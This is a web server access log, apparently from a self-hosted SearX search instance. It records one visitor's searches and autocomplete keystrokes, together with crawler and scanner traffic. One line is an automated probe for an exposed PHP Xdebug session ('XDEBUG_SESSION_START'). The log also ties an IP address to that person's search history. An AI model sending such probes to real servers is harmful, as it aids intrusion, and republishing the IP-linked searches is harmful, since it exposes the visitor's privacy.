46.193.1.170 - - [27/Mar/2023:07:30:49 +0000] "POST /book-update-annotations/books/82/PDF HTTP/1.1" 200 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:32:01 +0000] "GET /search?q=masina+de+spalat+1940 HTTP/1.1" 200 10469 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:32:01 +0000] "GET /searx/static/themes/oscar/css/bootstrap.min.css HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:32:01 +0000] "GET /searx/static/themes/oscar/js/jquery.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:32:01 +0000] "GET /searx/static/themes/oscar/css/logicodev-dark.min.css HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:32:01 +0000] "GET /searx/static/themes/oscar/js/bootstrap.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:32:01 +0000] "GET /searx/static/themes/oscar/js/typeahead.bundle.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:32:01 +0000] "GET /searx/static/themes/oscar/js/searx.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:32:01 +0000] "GET /searx/static/plugins/js/search_on_category_select.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:32:02 +0000] "GET /searx/static/themes/oscar/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 200 18028 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:32:02 +0000] "GET /searx/static/themes/oscar/img/favicon.png HTTP/1.1" 200 98304 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
35.90.224.26 - - [27/Mar/2023:07:33:21 +0000] "GET / HTTP/1.1" 200 1970 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
35.86.158.40 - - [27/Mar/2023:07:33:28 +0000] "GET /favicon.ico HTTP/1.1" 404 188 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
35.86.158.40 - - [27/Mar/2023:07:33:33 +0000] "GET / HTTP/1.1" 200 1970 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
46.193.1.170 - - [27/Mar/2023:07:34:06 +0000] "POST /searx/search HTTP/1.1" 200 12946 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:06 +0000] "GET /searx/static/themes/oscar/css/bootstrap.min.css HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:06 +0000] "GET /searx/static/themes/oscar/js/bootstrap.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:06 +0000] "GET /searx/static/themes/oscar/css/logicodev-dark.min.css HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:06 +0000] "GET /searx/static/themes/oscar/js/searx.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:06 +0000] "GET /searx/static/plugins/js/search_on_category_select.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:06 +0000] "GET /searx/static/themes/oscar/js/typeahead.bundle.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:06 +0000] "GET /searx/static/themes/oscar/js/jquery.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:07 +0000] "GET /searx/static/themes/oscar/img/favicon.png HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:09 +0000] "GET /searx/autocompleter?q=masina%20de%20spalat%201940 HTTP/1.1" 200 2 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:12 +0000] "GET /searx/autocompleter?q=m HTTP/1.1" 200 130 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:13 +0000] "GET /searx/autocompleter?q=q HTTP/1.1" 200 128 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:15 +0000] "GET /searx/autocompleter?q=q%5C HTTP/1.1" 200 167 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:17 +0000] "GET /searx/autocompleter?q=a HTTP/1.1" 200 128 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:18 +0000] "GET /searx/autocompleter?q=al HTTP/1.1" 200 144 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:18 +0000] "GET /searx/autocompleter?q=alb HTTP/1.1" 200 145 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:19 +0000] "GET /searx/autocompleter?q=alba HTTP/1.1" 200 138 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:20 +0000] "GET /searx/autocompleter?q=albal HTTP/1.1" 200 177 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:21 +0000] "GET /searx/autocompleter?q=albalu HTTP/1.1" 200 167 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:21 +0000] "GET /searx/autocompleter?q=albalux HTTP/1.1" 200 179 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:23 +0000] "POST /searx/search HTTP/1.1" 200 12274 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:24 +0000] "GET /searx/static/themes/oscar/css/logicodev-dark.min.css HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:24 +0000] "GET /searx/static/themes/oscar/css/bootstrap.min.css HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:24 +0000] "GET /searx/static/themes/oscar/js/typeahead.bundle.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:24 +0000] "GET /searx/static/themes/oscar/js/jquery.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:24 +0000] "GET /searx/static/themes/oscar/js/bootstrap.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:24 +0000] "GET /searx/static/plugins/js/search_on_category_select.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:24 +0000] "GET /searx/static/themes/oscar/js/searx.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:24 +0000] "GET /searx/static/themes/oscar/img/favicon.png HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:26 +0000] "GET /searx/autocompleter?q=albalux HTTP/1.1" 200 179 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
54.201.146.123 - - [27/Mar/2023:07:34:26 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
46.193.1.170 - - [27/Mar/2023:07:34:26 +0000] "GET /searx/autocompleter?q=albalux%20 HTTP/1.1" 200 179 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
54.201.146.123 - - [27/Mar/2023:07:34:28 +0000] "GET / HTTP/1.1" 200 1970 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
46.193.1.170 - - [27/Mar/2023:07:34:29 +0000] "POST /searx/search HTTP/1.1" 200 12238 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:29 +0000] "GET /searx/static/themes/oscar/css/bootstrap.min.css HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:29 +0000] "GET /searx/static/themes/oscar/css/logicodev-dark.min.css HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:29 +0000] "GET /searx/static/themes/oscar/js/jquery.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:29 +0000] "GET /searx/static/themes/oscar/js/bootstrap.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:29 +0000] "GET /searx/static/themes/oscar/js/typeahead.bundle.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:29 +0000] "GET /searx/static/themes/oscar/js/searx.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:29 +0000] "GET /searx/static/plugins/js/search_on_category_select.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:43 +0000] "GET /searx/autocompleter?q=albalux%20masina%20de%20spalat HTTP/1.1" 200 317 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:47 +0000] "GET /searx/autocompleter?q=was HTTP/1.1" 200 171 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:48 +0000] "GET /searx/autocompleter?q=wasin HTTP/1.1" 200 218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:48 +0000] "GET /searx/autocompleter?q=wasing%20 HTTP/1.1" 200 218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:49 +0000] "GET /searx/autocompleter?q=wasing%20m HTTP/1.1" 200 279 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:50 +0000] "GET /searx/autocompleter?q=wasing%20ma HTTP/1.1" 200 279 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:50 +0000] "GET /searx/autocompleter?q=wasing%20mac HTTP/1.1" 200 279 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:51 +0000] "GET /searx/autocompleter?q=wasing%20machin HTTP/1.1" 200 279 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:52 +0000] "GET /searx/autocompleter?q=wasing%20machines%20 HTTP/1.1" 200 287 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:53 +0000] "GET /searx/autocompleter?q=wasing%20machines%20in HTTP/1.1" 200 316 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:53 +0000] "GET /searx/autocompleter?q=wasing%20machines%20in%20 HTTP/1.1" 200 316 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:55 +0000] "GET /searx/autocompleter?q=wasing%20machines%20in%201 HTTP/1.1" 200 284 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:56 +0000] "GET /searx/autocompleter?q=wasing%20machines%20in%2019 HTTP/1.1" 200 297 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:57 +0000] "GET /searx/autocompleter?q=wasing%20machines%20in%20194 HTTP/1.1" 200 194 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:57 +0000] "GET /searx/autocompleter?q=wasing%20machines%20in%201940 HTTP/1.1" 200 158 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:34:59 +0000] "POST /searx/search HTTP/1.1" 200 22714 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:35:00 +0000] "GET /searx/static/themes/oscar/css/bootstrap.min.css HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:35:00 +0000] "GET /searx/static/themes/oscar/css/logicodev-dark.min.css HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:35:00 +0000] "GET /searx/static/themes/oscar/js/bootstrap.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:35:00 +0000] "GET /searx/static/themes/oscar/js/typeahead.bundle.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:35:00 +0000] "GET /searx/static/themes/oscar/js/searx.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:35:00 +0000] "GET /searx/static/themes/oscar/js/jquery.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:35:00 +0000] "GET /searx/static/plugins/js/search_on_category_select.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
54.149.228.4 - - [27/Mar/2023:07:35:24 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
54.149.228.4 - - [27/Mar/2023:07:35:26 +0000] "GET / HTTP/1.1" 200 1970 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
34.216.38.30 - - [27/Mar/2023:07:35:39 +0000] "GET /favicon.ico HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
35.91.119.133 - - [27/Mar/2023:07:35:43 +0000] "GET /favicon.ico HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
34.216.38.30 - - [27/Mar/2023:07:35:43 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
35.91.119.133 - - [27/Mar/2023:07:35:43 +0000] "GET /favicon.ico HTTP/1.1" 404 188 "http://pseudot.org/favicon.ico" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
35.91.119.133 - - [27/Mar/2023:07:35:44 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
34.216.38.30 - - [27/Mar/2023:07:35:44 +0000] "GET / HTTP/1.1" 200 1970 "http://pseudot.org" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
35.91.119.133 - - [27/Mar/2023:07:35:44 +0000] "GET / HTTP/1.1" 200 1970 "http://pseudot.org" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
46.193.1.170 - - [27/Mar/2023:07:40:09 +0000] "GET /search?q=igem HTTP/1.1" 200 7968 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:40:09 +0000] "GET /searx/static/themes/oscar/css/bootstrap.min.css HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:40:09 +0000] "GET /searx/static/themes/oscar/js/jquery.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:40:09 +0000] "GET /searx/static/themes/oscar/css/logicodev-dark.min.css HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:40:09 +0000] "GET /searx/static/themes/oscar/js/bootstrap.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:40:09 +0000] "GET /searx/static/themes/oscar/js/searx.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:40:09 +0000] "GET /searx/static/plugins/js/search_on_category_select.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:40:09 +0000] "GET /searx/static/themes/oscar/js/typeahead.bundle.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:40:09 +0000] "GET /searx/static/themes/oscar/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 200 18028 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
157.55.39.208 - - [27/Mar/2023:07:41:03 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
35.91.177.214 - - [27/Mar/2023:07:41:15 +0000] "GET / HTTP/1.1" 200 1583 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
35.86.158.40 - - [27/Mar/2023:07:41:25 +0000] "GET /favicon.ico HTTP/1.1" 200 15406 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
34.214.91.168 - - [27/Mar/2023:07:43:02 +0000] "GET / HTTP/1.1" 200 1583 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
35.86.158.40 - - [27/Mar/2023:07:43:27 +0000] "GET /favicon.ico HTTP/1.1" 200 15406 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
113.125.51.198 - - [27/Mar/2023:07:48:29 +0000] "GET / HTTP/1.1" 200 415708 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
152.89.196.54 - - [27/Mar/2023:07:49:07 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 1583 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
2001:470:1:332::70 - - [27/Mar/2023:07:56:22 +0000] "GET / HTTP/1.1" 200 1583 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
2001:470:1:332::70 - - [27/Mar/2023:08:00:05 +0000] "GET /favicon.ico HTTP/1.1" 200 15406 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 OPR/95.0.0.0 (Edition Yx 05)"
2001:470:1:332::65 - - [27/Mar/2023:08:00:26 +0000] "GET / HTTP/1.1" 200 1583 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
104.28.251.139 - - [27/Mar/2023:08:06:39 +0000] "GET /cdn-cgi/trace HTTP/1.1" 404 0 "-" "Mozilla/5.0"
46.193.1.170 - - [27/Mar/2023:08:09:17 +0000] "GET /search?q=cum+se+monteaza+o+priza HTTP/1.1" 200 8011 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:08:09:17 +0000] "GET /searx/static/themes/oscar/css/bootstrap.min.css HTTP/1.1" 200 125509 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:08:09:17 +0000] "GET /searx/static/themes/oscar/css/logicodev-dark.min.css HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:08:09:17 +0000] "GET /searx/static/themes/oscar/js/jquery.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:08:09:17 +0000] "GET /searx/static/themes/oscar/js/typeahead.bundle.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:08:09:17 +0000] "GET /searx/static/themes/oscar/js/bootstrap.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:08:09:17 +0000] "GET /searx/static/plugins/js/search_on_category_select.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:08:09:17 +0000] "GET /searx/static/themes/oscar/js/searx.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:08:09:17 +0000] "GET /searx/static/themes/oscar/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 200 18028 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:08:11:41 +0000] "GET /search?q=port+forwarding+docker+compose HTTP/1.1" 200 7722 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:08:11:41 +0000] "GET /searx/static/themes/oscar/css/bootstrap.min.css HTTP/1.1" 200 125509 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:08:11:41 +0000] "GET /searx/static/themes/oscar/css/logicodev-dark.min.css HTTP/1.1" 200 17731 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:08:11:41 +0000] "GET /searx/static/themes/oscar/js/jquery.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:08:11:41 +0000] "GET /searx/static/themes/oscar/js/bootstrap.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:08:11:41 +0000] "GET /searx/static/themes/oscar/js/searx.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:08:11:41 +0000] "GET /searx/static/themes/oscar/js/typeahead.bundle.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
